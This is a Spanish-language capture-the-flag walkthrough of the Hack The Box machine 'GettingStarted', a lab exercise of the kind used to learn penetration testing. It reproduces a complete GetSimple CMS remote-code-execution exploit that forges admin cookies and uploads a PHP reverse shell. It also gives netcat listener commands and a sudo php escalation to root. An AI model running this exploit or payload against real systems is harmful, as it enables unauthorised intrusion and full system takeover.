---
tags:
title: GettingStarted - Easy (HTB)
permalink: /GettingStarted-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

Empezamos con un escaneo de puertos y servicios con nmap.

```bash 
nmap -sCV -p22,80 10.129.211.160
```

![Pasted image 20250820162115](images/Pasted image 20250820162115.png)

Nos dirigimos a la pagina web que corre por el peurto `80`.

![Pasted image 20250820162304](images/Pasted image 20250820162304.png)

Si nos vamos al `robots.txt` que nos indicaba el `nmap` que habia. el cual nos indica de un directorio `/admin/` el cual nos indica `gobuster` a continuación (el cual ya previamente puse a correr en busca de subdirectorios)

![Pasted image 20250820162400](images/Pasted image 20250820162400.png)


El directorio `admin` es un panel de login para la aplicacion web, el cual si probamos por credenciales default como `admin:admin` o `admin:password` vemos que las credenciales `admin:admin` funcionan y nos permiten loguear, pero y si no sabiamos eso? Bueno hay una via alternativa la cual es la que yo use para encontrar la contraseña.

Como anterior mente la herramienta `gobuster` encontro posibles rutas, voy a checkear si tengo posibilidad de `directory listing`en cada una de estas, empezemos con `data` y asi con las siguientes.

![Pasted image 20250820161849](images/Pasted image 20250820161849.png)

Al parecer si tenemos dicha capacidad.

![Pasted image 20250820162942](images/Pasted image 20250820162942.png)

Como los que parecen poder tener informacion son `users/` y `other/` vamos a enumerarlos.

![Pasted image 20250820163054](images/Pasted image 20250820163054.png)

Vemos que dentro de `/users` hay un `admin.xml` y si vemos su contenido, vemos unas etiquetas `pwd` que podemos intuir que es la abreviación de password, con un `hash` en `sha1`pareciera ser.

![Pasted image 20250820163200](images/Pasted image 20250820163200.png)

Si usamos paginas como `crackstation` podemos crackearlo facilmente. y asi encontrar el password del usuario `admin`.

![Pasted image 20250820163224](images/Pasted image 20250820163224.png)

Una vez logueados en la pagina.

![Pasted image 20250820163408](images/Pasted image 20250820163408.png)

![Pasted image 20250820163635](images/Pasted image 20250820163635.png)

Vemos que corre la version `3.3.15` de `GetSimple CMS` la cual es vulenrable a RCE.

```bash 
searchsploit getsimple CMS
```

![Pasted image 20250820165143](images/Pasted image 20250820165143.png)

![Pasted image 20250820165201](images/Pasted image 20250820165201.png)

Nos descargamos el exploit

```bash 
searchsploit -m php/webapps/51475.py 
```

Lo renombramos.
```bash 
mv 51475.py exploit.py
```

El contenido es este: 

```python
# Exploit Title: GetSimple CMS v3.3.16 - Remote Code Execution (RCE)
# Data: 18/5/2023
# Exploit Author : Youssef Muhammad
# Vendor: Get-simple
# Software Link:
# Version app: 3.3.16
# Tested on: linux
# CVE: CVE-2022-41544

import sys
import hashlib
import re
import requests
from xml.etree import ElementTree
from threading import Thread
import telnetlib3

purple = "\033[0;35m"
reset = "\033[0m"
yellow = "\033[93m"
blue = "\033[34m"
red = "\033[0;31m"

def print_the_banner():
    print(purple + '''
 CCC V     V EEEE      22   000   22   22      4  4  11  5555 4  4 4  4
C    V     V E        2  2 0  00 2  2 2  2     4  4 111  5    4  4 4  4
C     V   V  EEE  ---   2  0 0 0   2    2  --- 4444  11  555  4444 4444
C      V V   E         2   00  0  2    2          4  11     5    4    4
 CCC    V    EEEE     2222  000  2222 2222        4 11l1 555     4    4
 '''+ reset)

def get_version(target, path):
    r = requests.get(f"http://{target}{path}admin/index.php")
    match = re.search(r"jquery.getsimple.js\?v=(.*)\"", r.text)
    if match:
        version = match.group(1)
        if version <= "3.3.16":
            print( red + f"[+] the version {version} is vulnrable to CVE-2022-41544")
        else:
            print ("This is not vulnrable to this CVE")
        return version
    return None

def api_leak(target, path):
    r = requests.get(f"http://{target}{path}data/other/authorization.xml")
    if r.ok:
        tree = ElementTree.fromstring(r.content)
        apikey = tree[0].text
        print(f"[+] apikey obtained {apikey}")
        return apikey
    return None

def set_cookies(username, version, apikey):
    cookie_name = hashlib.sha1(f"getsimple_cookie_{version.replace('.', '')}{apikey}".encode()).hexdigest()
    cookie_value = hashlib.sha1(f"{username}{apikey}".encode()).hexdigest()
    cookies = f"GS_ADMIN_USERNAME={username};{cookie_name}={cookie_value}"
    headers = {
        'Content-Type':'application/x-www-form-urlencoded',
        'Cookie': cookies
    }
    return headers

def get_csrf_token(target, path, headers):
    r = requests.get(f"http://{target}{path}admin/theme-edit.php", headers=headers)
    m = re.search('nonce" type="hidden" value="(.*)"', r.text)
    if m:
        print("[+] csrf token obtained")
        return m.group(1)
    return None

def upload_shell(target, path, headers, nonce, shell_content):
    upload_url = f"http://{target}{path}admin/theme-edit.php?updated=true"
    payload = {
        'content': shell_content,
        'edited_file': '../shell.php',
        'nonce': nonce,
        'submitsave': 1
    }
    try:
        response = requests.post(upload_url, headers=headers, data=payload)
        if response.status_code == 200:
            print("[+] Shell uploaded successfully!")
        else:
            print("(-) Shell upload failed!")
    except requests.exceptions.RequestException as e:
        print("(-) An error occurred while uploading the shell:", e)
def shell_trigger(target, path):
    url = f"http://{target}{path}/shell.php"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("[+] Webshell trigged successfully!")
        else:
            print("(-) Failed to visit the page!")
    except requests.exceptions.RequestException as e:
        print("(-) An error occurred while visiting the page:", e)

def main():
    if len(sys.argv) != 5:
        print("Usage: python3 CVE-2022-41544.py <target> <path> <ip:port> <username>")
        return

    target = sys.argv[1]
    path = sys.argv[2]
    if not path.endswith('/'):
        path += '/'

    ip, port = sys.argv[3].split(':')
    username = sys.argv[4]
    shell_content = f"""<?php
    $ip = '{ip}';
    $port = {port};
    $sock = fsockopen($ip, $port);
    $proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
    """

    version = get_version(target, path)
    if not version:
        print("(-) could not get version")
        return

    apikey = api_leak(target, path)
    if not apikey:
        print("(-) could not get apikey")
        return

    headers = set_cookies(username, version, apikey)

    nonce = get_csrf_token(target, path, headers)
    if not nonce:
        print("(-) could not get nonce")
        return

    upload_shell(target, path, headers, nonce, shell_content)
    shell_trigger(target, path)

if __name__ == '__main__':
    print_the_banner()
    main()
```

Preparamos nuestro listener con `NetCat` y lo ejecutamos.

```bash 
nc -nlvp 4444
```

```bash 
python3 exploit.py 10.129.211.160 / 10.10.16.230:4444 admin
```

![Pasted image 20250820165554](images/Pasted image 20250820165554.png)

Realizamos un tratamiento de la `tty` para que no muera.

Viendo por permisos a nivel de `SUDOERS`

![Untitled 49 1](images/Untitled 49 1.jpg)

Vemos que tenemos privilegios al usar `php`, esto es malo ya que si nos vamos a la pagina GTFObins vemos como podemos abusar de este.

![Untitled 50 1](images/Untitled 50 1.jpg)

```bash 
CMD="/bin/bash"
```

```bash 
sudo php -r "system('$CMD');"
```

![Pasted image 20250820170002](images/Pasted image 20250820170002.png)

Y asi ganamos acceso como el usuario `root`y ya podemos visualizar la flag.

![Pasted image 20250820170054](images/Pasted image 20250820170054.png)

```bash 
cat /root/root.txt
```

`~Happy Hacking.`
